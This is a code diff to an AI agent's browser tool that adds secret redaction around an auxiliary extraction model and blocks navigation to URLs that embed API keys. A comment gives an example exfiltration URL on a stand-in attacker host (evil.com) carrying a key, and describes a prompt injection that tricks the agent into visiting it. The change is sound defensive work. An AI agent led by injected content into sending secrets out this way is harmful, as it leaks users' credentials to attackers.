@@ -982,6 +982,13 @@ def _extract_relevant_content(
             f"Provide a concise summary focused on interactive elements and key content."
         )
 
+    # Redact secrets from snapshot before sending to auxiliary LLM.
+    # Without this, a page displaying env vars or API keys would leak
+    # secrets to the extraction model before run_agent.py's general
+    # redaction layer ever sees the tool result.
+    from agent.redact import redact_sensitive_text
+    extraction_prompt = redact_sensitive_text(extraction_prompt)
+
     try:
         call_kwargs = {
             "task": "web_extract",
@@ -993,7 +1000,9 @@ def _extract_relevant_content(
         if model:
             call_kwargs["model"] = model
         response = call_llm(**call_kwargs)
-        return (response.choices[0].message.content or "").strip() or _truncate_snapshot(snapshot_text)
+        extracted = (response.choices[0].message.content or "").strip() or _truncate_snapshot(snapshot_text)
+        # Redact any secrets the auxiliary LLM may have echoed back.
+        return redact_sensitive_text(extracted)
     except Exception:
         return _truncate_snapshot(snapshot_text)
 
@@ -1030,6 +1039,20 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    # Secret exfiltration protection — block URLs that embed API keys or
+    # tokens in query parameters. A prompt injection could trick the agent
+    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    try:
+        from agent.redact import _PREFIX_RE
+        if _PREFIX_RE.search(url):
+            return json.dumps({
+                "success": False,
+                "error": "Blocked: URL contains what appears to be an API key or token. "
+                         "Secrets must not be sent in URLs.",
+            })
+    except Exception:
+        pass
+
     # SSRF protection — block private/internal addresses before navigating
     if not _is_safe_url(url):
         return json.dumps({
